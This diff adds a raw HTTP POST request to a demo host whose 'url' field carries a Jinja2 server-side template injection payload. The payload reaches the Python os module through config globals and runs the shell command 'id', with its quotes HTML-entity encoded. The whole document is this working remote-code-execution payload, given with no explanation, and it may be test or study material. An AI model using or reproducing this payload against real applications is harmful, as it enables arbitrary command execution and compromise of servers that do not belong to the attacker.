@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 86
+Connection: close
+
+url={{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;id&#39;).read()}}
